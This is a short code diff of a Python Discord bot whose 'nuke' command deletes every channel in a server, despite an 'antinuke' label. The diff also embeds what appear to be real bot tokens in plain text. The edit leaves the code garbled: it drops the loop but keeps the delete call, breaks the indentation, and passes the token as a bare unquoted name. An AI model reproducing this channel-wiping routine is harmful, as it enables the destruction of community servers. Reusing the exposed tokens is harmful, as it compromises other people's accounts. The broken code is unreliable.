@@ -6,12 +6,10 @@ async def on_ready(true):
 
 bot.command(antinuke)
 async def nuke(self, ctx):
-    for channel in ctx.guild.channels:
-        try:
-            await channel.delete()
+           await channel.delete()
         except:
             pass
     print('Complete')
 
-token = input('OTQ0NDQxNDU1MTE4NzgyNTE0.YhBppQ.RO5rx1GIQ4LwxNVusaEYKCFWWak')
-bot.run(OTQ0NDQxNDU1MTE4NzgyNTE0.YhBppQ.RO5rx1GIQ4LwxNVusaEYKCFWWak)
+token = input('-Q_qB-bAzgtsfOLxZqnhXYwd0awM28Hc')
+bot.run(-Q_qB-bAzgtsfOLxZqnhXYwd0awM28Hc)
